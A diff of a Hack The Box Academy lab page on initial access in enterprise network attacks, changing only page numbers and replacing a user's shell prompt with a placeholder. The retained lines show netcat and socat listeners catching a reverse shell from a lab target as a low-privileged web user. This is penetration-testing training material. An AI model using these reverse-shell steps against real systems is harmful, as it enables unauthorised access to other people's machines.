@@ -8,12 +8,12 @@
 // Section ID: 1546
 // Section Title: Initial Access
 // Page Title: Hack The Box - Academy
-// Page Number: 6
+// Page Number: 06
 -->
 
 # Initial Access
 
-**Module Name:** Attacking Enterprise Networks **Page Number:** 6
+**Module Name:** Attacking Enterprise Networks **Page Number:** 06
 
 #### 
 
@@ -41,7 +41,7 @@ Connection: close
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ nc -nvlp 8443
+[!bash!]$ nc -nvlp 8443
 
 listening on [any] 8443 ...
 connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 51496
@@ -50,11 +50,11 @@ uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ socat file:`tty`,raw,echo=0 tcp-listen:4443
+[!bash!]$ socat file:`tty`,raw,echo=0 tcp-listen:4443
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ nc -lnvp 8443
+[!bash!]$ nc -lnvp 8443
 
 listening on [any] 8443 ...
 connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174
